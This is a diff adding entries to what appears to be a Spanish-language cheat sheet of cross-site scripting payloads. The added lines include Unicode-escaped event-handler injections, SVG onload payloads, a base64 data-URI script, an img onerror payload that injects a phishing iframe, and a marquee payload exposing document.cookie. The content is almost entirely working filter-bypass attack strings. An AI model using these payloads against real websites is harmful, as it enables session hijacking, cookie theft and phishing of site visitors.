@@ -5,10 +5,22 @@
 
 `'"><script>alert`1`</script><h1>d</h1>`
 
+### h1
 
+```
+<h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>
 
+<a onclick=\u0041\u006cert("_Y000!_")>Y00</a>
 
+<p onclick=\u0041\u006cert("_Y000!_")>Y00</p>
 
+<marquee onclick=\u0041\u006cert("_Y000!_")>Y00</marquee>
+
+```
+
+### onMouseOver
+
+`onMouseOver=<script>alert("/XSS BY Y000!/")</script>`
 
 
 ### Xss dentro de un botón en form:
@@ -51,4 +63,25 @@
 "onfocus="alert('Y000')"+autofocus="
 
 </script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>
+
+"><svg/onload=alert`${'000'}¥000!.was.here$`>
+
 ```
+
+
+### JavaScript
+
+`<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydGBZMDAwYDwvc2NyaXB0Pg=='></object>`
+
+### document.write + iframe
+
+`<img src="x" onerror="document.write('<iframe src=tu_phishing></iframe>')"/>`
+
+
+### xss + Unicode
+
+`<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>Y000</marquee>`
+
+
+
+
